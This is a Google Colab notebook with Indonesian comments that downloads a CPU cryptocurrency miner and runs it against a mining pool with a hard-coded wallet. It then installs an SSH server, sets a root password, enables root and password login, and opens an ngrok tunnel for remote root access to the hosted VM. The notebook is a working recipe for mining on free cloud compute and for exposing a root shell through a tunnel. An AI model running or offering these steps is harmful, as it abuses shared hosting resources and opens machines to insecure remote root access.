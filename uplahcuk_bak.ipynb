{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "uplahcuk.bak",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/newstore0077/minaa/blob/main/uplahcuk_bak.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4cbgwZWWfWpp"
      },
      "source": [
        "# Halo bos..., "
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Saya peringatkan ini sistem nyari gak dapat untung gak dapat nyari lagi**\n",
        "\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "id": "_TQ2U3LOeUxh"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Dibawah ini untuk 40 cpu pastikan runtimenya sudah di ganti menjadi TPU"
      ],
      "metadata": {
        "id": "2ux0mJcWdRa7"
      }
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "HwYj1kAF2zgC"
      },
      "source": [
        "!lscpu"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "dibawah ini untuk gpu pastikan runtimenya sudah di ganti ke gpu"
      ],
      "metadata": {
        "id": "_AfvZwobdsMf"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!nvidia-smi"
      ],
      "metadata": {
        "id": "bihoghMtdzgm"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "script miningnya silahkan pastekan di bawah ini"
      ],
      "metadata": {
        "id": "GP6NxveRfgxk"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Donwload CPU Miner (SUGAR)\n",
        "!wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz\n",
        " \n",
        "# extrak file\n",
        "!tar xf cpuminer-opt-linux.tar.gz\n",
        " \n",
        "# Run Mining\n",
        "!./cpuminer-avx2 -a minotaurx -o stratum+tcp://stratum-eu.rplant.xyz:17068 -u RDjj8e6s8kVxkhSev5fu8MG3RFNmadUNc4.ph1 -p c=AVN\n",
        "\n",
        "# selesai  \n",
        " "
      ],
      "metadata": {
        "id": "gmQCc7OMfn1S"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "bagi yang mau connectkan ke ssh atau lewat putty dan yang lainnya silahkan run di bawah"
      ],
      "metadata": {
        "id": "NaFvrn1PeIVJ"
      }
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "9D6_2njrO57G"
      },
      "source": [
        "\n",
        "import random, string, urllib.request, json, getpass\n",
        "\n",
        "#Generate root password\n",
        "\n",
        "password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))\n",
        "\n",
        "#Download ngrok\n",
        "\n",
        "! wget -q -c -nc https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip\n",
        "\n",
        "! unzip -qq -n ngrok-stable-linux-amd64.zip\n",
        "\n",
        "#Setup sshd\n",
        "\n",
        "! apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen > /dev/null\n",
        "\n",
        "#Set root password\n",
        "\n",
        "! echo root:$password | chpasswd\n",
        "\n",
        "! mkdir -p /var/run/sshd\n",
        "\n",
        "! echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config\n",
        "\n",
        "! echo \"PasswordAuthentication yes\" >> /etc/ssh/sshd_config\n",
        "\n",
        "! echo \"LD_LIBRARY_PATH=/usr/lib64-nvidia\" >> /root/.bashrc\n",
        "\n",
        "! echo \"export LD_LIBRARY_PATH\" >> /root/.bashrc\n",
        "\n",
        "#Run sshd\n",
        "\n",
        "get_ipython().system_raw('/usr/sbin/sshd -D &')\n",
        "\n",
        "#Ask token\n",
        "\n",
        "print(\"Copy authtoken from https://dashboard.ngrok.com/auth\")\n",
        "\n",
        "authtoken = getpass.getpass()\n",
        "\n",
        "#Create tunnel\n",
        "\n",
        "get_ipython().system_raw('./ngrok authtoken $authtoken && ./ngrok tcp 22 &')\n",
        "\n",
        "#Get public address and print connect command\n",
        "\n",
        "with urllib.request.urlopen('http://localhost:4040/api/tunnels') as response:\n",
        "\n",
        "  data = json.loads(response.read().decode())\n",
        "\n",
        "  (host, port) = data['tunnels'][0]['public_url'][6:].split(':')\n",
        "\n",
        "  print(f'SSH command: ssh -p{port} root@{host}')\n",
        "\n",
        "#Print root password\n",
        "\n",
        "print(f'Root password: {password}')"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}